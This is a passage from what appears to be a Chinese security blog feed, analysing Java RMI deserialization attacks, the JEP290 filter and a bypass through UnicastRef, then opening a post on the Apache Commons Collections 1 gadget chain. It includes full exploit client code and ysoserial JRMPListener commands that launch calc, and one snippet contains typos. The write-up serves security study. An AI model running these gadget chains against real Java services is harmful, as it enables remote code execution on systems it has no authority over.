&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Threezh1&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class AnnotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);</span><br><span class="line">        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123; Remote.class &#125;, evalObject));</span><br><span class="line">        Registry registry_remote = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">23335</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取super.ref</span></span><br><span class="line">        Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        UnicastRef ref = (UnicastRef) fields_0[<span class="number">0</span>].get(registry_remote);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取operations</span></span><br><span class="line">        Field[] fields_1 = registry_remote.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry_remote);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 跟lookup方法一样的传值过程</span></span><br><span class="line">        RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">        var3.writeObject(proxyEvalObject);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">        registry_remote.lookup(<span class="string">&quot;HelloRegistry&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi start at 3333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注册端攻击客户端"><a href="#注册端攻击客户端" class="headerlink" title="注册端攻击客户端"></a>注册端攻击客户端</h3><p>客户端向注册端调用list，lookup等函数查询服务后，注册端会返回查询结果的序列化形式给客户端，客户端收到后会进行反序列化操作，这就存在反序列化攻击的可能，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String url = <span class="string">&quot;rmi://127.0.0.1:23335/exp&quot;</span>;</span><br><span class="line">            user user = (user)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial开启恶意注册端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp .\ysoserial-master-d367e379d9-<span class="number">1.</span>jar ysoserial.exploit.JRMPListener <span class="number">23335</span> CommonsCollections1 <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure><h2 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h2><p>在JDK8u121，JDK7u13，JDK6u141之后添加了一个新的安全机制JEP-290</p><p>在JDK8u121，JDK7u13，JDK6u141之后添加了一个新的安全机制JEP-290，它提供了一个接口<code>ObjectInputFilter</code>，可以通过这个接口来实现反序列化时依照白名单实现类的过滤。</p><p>RMI过程中默认有过滤器，<code>RegistryImpl#registryFilter</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215502.png"></p><p>可以发现白名单类有这些</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory /  ActivationID / UID</span><br></pre></td></tr></table></figure><p>只要在反序列化过程中出现的类不是上述类，就会抛出REJECTED异常</p><p>下面是我在8u181 发起客户端攻击注册端时抛出的REJECTED异常。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215508.png"></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>RMI的过滤器是如何发挥作用的呢？带着这个疑问，我们去调试一下代码。</p><p>假设此时客户端仿写lookup方法向注册端发送了一个对象，或者服务端向注册端发送了一个bind/rebind请求，注册端便会调用UnicastServerRef来处理请求。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215516.png"></p><p>跟进这个UnicastServerRef#oldDispatch方法：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215523.png"></p><p>在oldDispatch倒数第二排代码，调用了UnicastServerRef#unmarshalCustomCallData方法，跟进一下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215529.png"></p><p>可以看见该方法使用了setObjectInputFilter方法，而这个方法是用作于给序列化数据增加过滤器的</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215526.png"></p><p>这里便是为当前序列化流增加了UnicastServerRef.this.filter这个过滤器。</p><blockquote><p>那么UnicastServerRef.this.filter这个值又是哪里来的呢？<br>答案是在调用getRegistry时UnicastServerRef便被初始化了，其filter值也被进行了赋值(Naming.bind 会自动调用 LocateRegistry.getRegistry)。<br>如下图便是跟进LocateRegistry.getRegistry方法后的代码，此处实例化了一个UnicastServerRef对象。</p></blockquote><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215533.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215540.png"></p><blockquote><p>所以UnicastServerRef.this.filter的值便是RegistryImpl#registryFilter</p></blockquote><p>在调用unmarshalCustomCallData设置好当前序列化流的过滤器后，程序再开始调用RegistryImpl_Skel#dispatch来进行反序列化操作</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215537.png"></p><p>在readObject方法中会判断当前序列化流是否配置有过滤器，如果有过滤器就在下面用checkInput对序列化流进行过滤。而checkInput实质是是调用序列化流的过滤器来进行过滤</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215633.png"></p><p>下图是从反序列化到过滤的栈帧。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215637.png"></p><h1 id="JEP290-BYPASS"><a href="#JEP290-BYPASS" class="headerlink" title="JEP290 BYPASS"></a>JEP290 BYPASS</h1><h2 id="UnicastRef（JDK-lt-8u231）"><a href="#UnicastRef（JDK-lt-8u231）" class="headerlink" title="UnicastRef（JDK&lt;=8u231）"></a>UnicastRef（JDK&lt;=8u231）</h2><p>RegistryImpl_stub过滤中的白名单类中有UnicastRef 类，我们可以在这个类上下文章绕过JEP290.</p><blockquote><p>这里先来把该攻击方法的大致轮廓勾勒出来，方便阅读下面的内容：<br>首先我们向注册端发送一个恶意对象<br>该对象能在被反序列化时主动向一个恶意注册端发起通讯并反序列化其传送过来的内容，此过程的反序列化没有经过Filter检验<br>完成攻击</p></blockquote><p>我所进行调试的代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:1069/user&quot;</span>;</span><br><span class="line">        user user = <span class="keyword">new</span> userImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1069</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server Running At：&quot;</span> + url);</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端的exp如下，我们可以跟着exp中的内容抽丝剥茧的分析</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ublic <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry reg = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1069</span>);</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        reg.bind(<span class="string">&quot;test12&quot;</span>,proxy);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LiveRef"><a href="#LiveRef" class="headerlink" title="LiveRef"></a>LiveRef</h3><p>我们先来看看LiveRef，这对象是RMI通讯中比较核心的部分，它记录了注册端的各种信息。我们通过以下内容来看LiveRef是如何定位注册端的，为我们撰写EXP时通过LiveRef定位恶意注册端做铺垫。</p><p>在Naming.lookup 或者 Naming.bind方法中，都会先通过getRegistry方法获取注册端。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215645.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215650.png"></p><p>而getRegistry返回的对象是一个封装了的UnicastRef对象，UnicastRef中封装了LiveRef对象，存储了注册端信息。<br>所以实际上注册端信息是由封装在UnicastRef对象中的LiveRef对象来存储的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215647.png"></p><p>在bind方法执行时，会先通过UnicastRef.newcall利用LiveRef存储的注册端信息去定位注册端</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215831.png"></p><p>那么LiveRef中存储的信息（ep,id,islocal)是从哪来的呢？我们就需要去看看UnicastRef是如何初始化LiveRef这个类的。</p><p>于UnicastRef#UnicastRef(LiveRef var1)与服务端bind处下断点，当断点在bind处停下时使其继续运行到UnicastRef#UnicastRef(LiveRef var1。我们可以看到如下栈帧</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215839.png"></p><p>在LocateRegistry#getRegistry 处会实例化LiveRef并传入参数，然后用此LiveRef对象实例化UnicastRef。</p><p>我们看看实例化LiveRef时传入的前两个参数。</p><p>先来看objid，这里的ObjID。REGISTRY_ID是一个固定值0</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215842.png"></p><p>再来看看TCPEndpoint，传入TCPEndpoint的参数分别是从rmi地址字符串中读取的host，port以及两个null值（csf固定为null）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215845.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215849.png"></p><p>到这里就明白了LiveRef是如何定位注册端的了。</p><h3 id="RemoteObjectInvocationHandler"><a href="#RemoteObjectInvocationHandler" class="headerlink" title="RemoteObjectInvocationHandler"></a>RemoteObjectInvocationHandler</h3><p>RemoteObjectInvocationHandler 这个对象是Remote的子类，所以是可以通过RMI的过滤检测的。</p><p>exp运行后，当注册端反序列化时，会调用RemoteObjectInvocationHandler父类RemoteObject的readObject方法（因为RemoteObjectInvocationHandler自身并无readObject方法），在RemoteObject的readObject方法末行有一个ref.readExternal(in)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220029.png"></p><p>跟进该方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220032.png"></p><p>调用了LiveRef的静态方法read，跟进该方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220035.png"></p><p>发现这个方法会根据序列化流中的内容还原出LiveRef对象，还原出的LiveRef对象中记录了恶意注册端的IP和端口号等信息。</p><p>然后再经过一系列的流程，会调用到DGCClient#registerRefs</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220037.png"></p><p>56行以LiveRef中记录的恶意注册端地址为参数，调用了DGCClient.EndpointEntry.lookup，返回了一个封装了恶意注册端地址的DGCClient对象。<br>然后调用了该DGCClient对象的registerRefs方法。跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220043.png"></p><p>再DGCClient#registerRefs 末行会调用一个makeDirtyCall方法，其中var2封装了指向恶意注册端的LiveRef对象，跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220046.png"></p><p>然后会调用一个this.dgc.dirty方法，this.dgc中封装了指向恶意注册端的LiveRef，跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220050.png"></p><p>此处的代码（DGCImpl_stub#dirty）就很像<br>该方法会先向恶意注册端建立通讯，发送序列化信息，接收注册端传来的信息并进行反序列化。在该readObject进行反序列化时并没有设置过滤器，所以自然而然地便绕过了RMI通讯中JEP290设置的过滤器的检测，从而可以反序列化任何恶意注册端传来的序列化流，造成反序列化攻击。</p><h3 id="完整复现"><a href="#完整复现" class="headerlink" title="完整复现"></a>完整复现</h3><p>首先开启注册端，user类的具体代码就不贴了，注册端端口为1069</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:1069/user&quot;</span>;</span><br><span class="line">        user user = <span class="keyword">new</span> userImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1069</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server Running At：&quot;</span> + url);</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry reg = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1069</span>);</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        reg.bind(<span class="string">&quot;test12&quot;</span>,obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后ysoserial启动恶意注册端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp .\ysoserial-master-d367e379d9-<span class="number">1.</span>jar ysoserial.exploit.JRMPListener <span class="number">8888</span> CommonsCollections5 <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure><p>客户端运行，成功弹出计算器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220055.png"></p><h3 id="仿写lookup实现"><a href="#仿写lookup实现" class="headerlink" title="仿写lookup实现"></a>仿写lookup实现</h3><p>除了bind，也可以用lookup的仿写来实现，这两者之间底层原理都是一样的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1069</span>);</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;localhost&quot;</span>, <span class="number">8888</span>);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">true</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//模仿lookup请求</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        UnicastRef ref2 = (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line">        RemoteCall var2 = ref2.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">        var3.writeObject(obj);</span><br><span class="line">        ref2.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所以本质上此绕过方法是<strong>通过反序列化让注册端变为JRMP客户端，向我们恶意的JRMP注册端发起 JRMP 请求。</strong></p><p>借用一下ttpfx师傅的图复盘全过程</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130220058.png"></p><p>UnicastRef中的LiveRef被用作定位注册端，这是前提。<br>RemoteObject的readObject方法会在RMI反序列化过程中被调用，其readObject方法会在后续中还原所封装的LiveRef对象，并向LiveRef对象指向的注册端发起通讯，反序列化其返回的数据，由于该反序列化流未增添过滤器，所以绕过JEP290造成了反序列化攻击。</p><p>因为文章是在边调试边写的，中途进行了多次删改，所以导致些许地方言辞不够准确，望各位见谅。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;RMI-ATTACK&quot;&gt;&lt;a href=&quot;#RMI-ATTACK&quot; class=&quot;headerlink&quot; title=&quot;RMI ATTACK&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Apache-Commons-Collections 反序列化分析</title>
    <link href="http://const27.com/2021/11/27/Apache-Commons-Collections%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://const27.com/2021/11/27/Apache-Commons-Collections%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2021-11-26T17:44:58.967Z</published>
    <updated>2021-11-26T17:46:33.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache-Commons-Collections-1"><a href="#Apache-Commons-Collections-1" class="headerlink" title="Apache-Commons-Collections 1"></a>Apache-Commons-Collections 1</h1><h2 id="Transformer-Map-链"><a href="#Transformer-Map-链" class="headerlink" title="Transformer Map 链"></a>Transformer Map 链</h2><h3 id="RCE原理"><a href="#RCE原理" class="headerlink" title="RCE原理"></a>RCE原理</h3><p>我在网上找到了一则利用代码，虽然这个利用代码很粗浅，并没有CC链1的触发过程，但是对于这条链的原理还是可见一斑的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]</span><br><span class="line">                                &#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain &#x3D; new</span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap &#x3D; new HashMap();</span><br><span class="line">        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TransformerMap类"><a href="#TransformerMap类" class="headerlink" title="TransformerMap类"></a>TransformerMap类</h4><p>TransformerMap类是造成这个漏洞的原因之一</p><p>TransformerMap是apacheCommonsCollections里提供的一个数据类型。它可以修饰一个Map类型的对象。当修饰过的Map添加新元素时，它会调用在decorate里声明好的Trasnformer类的transform方法并传入新添的键名或值名。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map DecoratedMap &#x3D; TransformedMap.decorate（Map,keyTransformer,</span><br><span class="line">valueTransformer）</span><br></pre></td></tr></table></figure><p>keyTransformer和valueTransformer分别指向不同的Transformer类。</p><h4 id="Transformer类"><a href="#Transformer类" class="headerlink" title="Transformer类"></a>Transformer类</h4><p>我们看一下Transformer类</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150055.png" alt="QQ截图20210217150055"></p><p>可以发现它只是一个借口，他的方法需要其他子类实现。<br>当TransformerMap在新添元素时就会调用decorate里设定好的Transformer类的transform方法。<br>它的接口实现类有以下几个。</p><h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>这个类主要的两个方法就是这俩了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant &#x3D; constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没什么好说的，就是把传入的对象原原本本返回。</p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>也是两个重要方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName &#x3D; methodName;</span><br><span class="line">        this.iParamTypes &#x3D; paramTypes;</span><br><span class="line">        this.iArgs &#x3D; args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls &#x3D; input.getClass();</span><br><span class="line">                Method method &#x3D; cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是传入方法名，参数类型和参数，然后通过反射来执行这个方法</p><h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p>也是两个重要方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">     this.iTransformers &#x3D; transformers;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public Object transform(Object object) &#123;</span><br><span class="line">     for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">         object &#x3D; this.iTransformers[i].transform(object);</span><br><span class="line">     &#125;</span><br><span 